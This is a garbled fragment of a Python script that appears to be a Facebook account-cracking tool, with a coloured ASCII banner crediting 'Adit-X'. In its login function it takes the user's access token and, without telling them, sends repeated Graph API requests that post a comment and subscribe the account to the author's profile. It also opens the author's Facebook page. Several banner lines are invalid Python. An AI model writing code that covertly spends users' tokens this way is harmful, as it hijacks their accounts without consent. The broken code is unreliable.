...
# BANNER #
def banner():
Print   ______\033[1;91m   __ __ \033[1;37m            __  
Print  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
Print / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
Print/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32mAdit-X.\033[1;37m
Print\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n
...
#    	exit()
        ...
        os.system('xdg-open https://www.facebook.com/100072241360914')
        try:
...
def login_xx():
    ...
    requests.post('https://graph.facebook.com/115041430913902/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Akun 2007
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Romi Afrizal 2018
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Romi Afrizal 2021
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Iqbal Bobz
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Iwan Hadiansyah
    requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket) # Hamzah Kirana
